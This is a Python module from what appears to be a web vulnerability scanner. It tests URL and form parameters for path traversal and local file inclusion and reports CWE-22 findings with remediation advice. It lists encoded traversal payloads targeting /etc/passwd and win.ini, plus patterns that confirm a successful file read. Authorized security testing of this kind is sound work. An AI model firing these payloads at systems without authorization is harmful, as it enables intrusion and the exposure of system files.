"""Path traversal / local file inclusion (LFI) scanner.

Tests GET parameters and common path parameters for directory traversal payloads.
Only run against targets you have explicit authorization to test.
"""

from __future__ import annotations

import re
import time
from dataclasses import dataclass
from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse

from bs4 import BeautifulSoup

from webscanner.core.http_client import ScopedHttpClient
from webscanner.core.types import Finding, ModuleResult, ScanModule, ScanTarget, Severity

# Traversal payloads (cross-platform)
_PAYLOADS: tuple[str, ...] = (
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "..%2f..%2fetc%2fpasswd",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252fetc%252fpasswd",      # double URL-encoded
    "..\\..\\.\\windows\\win.ini",        # Windows
    "..%5c..%5cwindows%5cwin.ini",
)

# Signatures in response that indicate successful file read
_UNIX_SIGNS: tuple[re.Pattern[str], ...] = tuple(
    re.compile(p, re.IGNORECASE) for p in (
        r"root:x:0:0",
        r"root:[^:]*:\d+:\d+:",
        r"/bin/bash",
        r"/bin/sh",
        r"www-data",
        r"nobody:[^:]*:\d+",
    )
)
_WINDOWS_SIGNS: tuple[re.Pattern[str], ...] = tuple(
    re.compile(p, re.IGNORECASE) for p in (
        r"\[extensions\]",
        r"\[fonts\]",
        r"MAPI=1",
    )
)


@dataclass(frozen=True)
class PathTraversalScanner:
    """Detects path traversal / LFI vulnerabilities in URL parameters."""

    http_client: ScopedHttpClient

    @property
    def module_name(self) -> str:
        return "path_traversal"

    @property
    def is_active_probe(self) -> bool:
        return True

    async def scan(self, target: ScanTarget) -> ModuleResult:
        start = time.monotonic()
        findings: list[Finding] = []

        try:
            response = await self.http_client.get(target.base_url)
            html = await response.text()
            params = _extract_params(html, target.base_url)

            for param_url, param_name in params:
                result = await self._test_param(param_url, param_name)
                if result:
                    findings.append(result)

            return ModuleResult(
                module=ScanModule.OWASP,
                findings=tuple(findings),
                duration_seconds=time.monotonic() - start,
                urls_scanned=len(params),
            )
        except Exception as exc:
            return ModuleResult(
                module=ScanModule.OWASP,
                findings=tuple(findings),
                duration_seconds=time.monotonic() - start,
                urls_scanned=0,
                error=str(exc),
            )

    async def _test_param(self, url: str, param_name: str) -> Finding | None:
        for payload in _PAYLOADS:
            test_url = _inject_param(url, param_name, payload)
            try:
                resp = await self.http_client.get(test_url)
                body = await resp.text()
                for pattern in _UNIX_SIGNS:
                    if pattern.search(body):
                        return Finding(
                            module=ScanModule.OWASP,
                            check_name="path_traversal_lfi",
                            severity=Severity.CRITICAL,
                            title=f"Path Traversal / LFI in parameter '{param_name}'",
                            description=(
                                "The server returned Unix system file content after a directory "
                                "traversal payload, indicating local file inclusion (LFI)."
                            ),
                            url=url,
                            evidence=f"Payload: {payload!r} → pattern matched: {pattern.pattern}",
                            remediation=(
                                "Validate and sanitize all file path inputs. Use an allow-list "
                                "of permitted file names. Never pass user input directly to "
                                "file system APIs."
                            ),
                            cwe_id="CWE-22",
                            cvss_score=9.1,
                        )
                for pattern in _WINDOWS_SIGNS:
                    if pattern.search(body):
                        return Finding(
                            module=ScanModule.OWASP,
                            check_name="path_traversal_lfi",
                            severity=Severity.CRITICAL,
                            title=f"Path Traversal / LFI in parameter '{param_name}'",
                            description=(
                                "The server returned Windows system file content after a directory "
                                "traversal payload, indicating local file inclusion (LFI)."
                            ),
                            url=url,
                            evidence=f"Payload: {payload!r} → pattern matched: {pattern.pattern}",
                            remediation=(
                                "Validate and sanitize all file path inputs. Use an allow-list "
                                "of permitted file names. Never pass user input directly to "
                                "file system APIs."
                            ),
                            cwe_id="CWE-22",
                            cvss_score=9.1,
                        )
            except Exception:
                continue
        return None


def _extract_params(html: str, base_url: str) -> list[tuple[str, str]]:
    params: list[tuple[str, str]] = []
    soup = BeautifulSoup(html, "lxml")

    for form in soup.find_all("form"):
        action = form.get("action", "")
        form_url = urljoin(base_url, action) if action else base_url
        for inp in form.find_all("input"):
            name = inp.get("name")
            if name:
                params.append((form_url, name))

    for link in soup.find_all("a", href=True):
        href = link["href"]
        full_url = urljoin(base_url, href)
        parsed = urlparse(full_url)
        for param_name in parse_qs(parsed.query):
            params.append((full_url, param_name))

    return params


def _inject_param(url: str, param_name: str, payload: str) -> str:
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query, keep_blank_values=True)
    query_params[param_name] = [payload]
    new_query = urlencode(query_params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))
